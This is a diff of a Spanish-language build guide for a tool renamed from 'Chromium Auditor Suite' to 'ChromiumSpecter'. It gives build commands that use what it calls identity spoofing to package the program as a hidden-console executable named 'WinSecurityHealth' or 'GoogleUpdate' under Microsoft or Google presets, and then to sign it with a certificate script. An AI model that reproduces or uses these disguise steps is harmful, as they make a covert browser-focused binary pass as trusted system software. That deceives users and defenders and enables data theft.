@@ -3,7 +3,7 @@
 > [!NOTE]
 > [English Version](COMPILATION_FLOWS.en.md) | **Versión en Español**
 
-Esta guía detalla los dos flujos de trabajo recomendados para generar el ejecutable final de la **Chromium Auditor Suite**, cubriendo tanto entornos híbridos como entornos puros de Linux/WSL.
+Esta guía detalla los dos flujos de trabajo recomendados para generar el ejecutable final de **ChromiumSpecter**, cubriendo tanto entornos híbridos como entornos puros de Linux/WSL.
 
 ---
 
@@ -29,14 +29,14 @@ Generate the `.exe` using the automation script with identity spoofing (e.g., mi
 python build.py --name "WinSecurityHealth" --preset microsoft --onefile --noconsole
 ```
 
-*El resultado estará en `dist/ChromiumAuditor.exe`.*
+*El resultado estará en `dist/ChromiumSpecter.exe`.*
 
 ### 3. Firma Digital (WSL/Linux)
 
 Copia el archivo a tu entorno WSL y ejecuta el script de certificación:
 
 ```bash
-bash autocert.sh dist/ChromiumAuditor.exe "TuContraseñaSegura"
+bash autocert.sh dist/ChromiumSpecter.exe "TuContraseñaSegura"
 ```
 
 ---
@@ -92,7 +92,7 @@ wine python build.py --name "GoogleUpdate" --preset google --onefile --noconsole
 Firma el binario directamente desde tu terminal de Linux:
 
 ```bash
-bash autocert.sh dist/ChromiumAuditor.exe
+bash autocert.sh dist/ChromiumSpecter.exe
 ```
 
 ---
